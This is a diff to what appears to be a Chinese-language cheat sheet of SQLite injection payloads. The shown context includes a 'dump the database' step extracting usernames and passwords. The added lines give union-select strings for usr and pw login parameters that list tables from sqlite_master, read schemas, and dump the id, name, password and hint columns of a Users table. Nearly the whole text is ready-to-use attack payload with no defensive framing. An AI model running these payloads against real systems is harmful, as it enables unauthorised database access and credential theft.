@@ -26,3 +26,14 @@ sqlite 注入的示例payload：
 第五步：脱库
 ?id=' union select 1,group_concat(username),group_concat(password) from users limit 0,1 --+
 ```
+
+```
+usr=' union select 1,group_concat(tbl_name) from sqlite_master where type='table'--&pw= //查所有表
+usr=' union select 1,group_concat(sql) from sqlite_master where tbl_name='Users'--&pw= //查表所有字段
+//查所有内容
+usr=' union select 1,group_concat(id) from Users--&pw=1
+usr=' union select 1,group_concat(name) from Users--&pw=1
+usr=' union select 1,group_concat(password) from Users--&pw=1
+usr=' union select 1,group_concat(hint) from Users--&pw=
+```
+
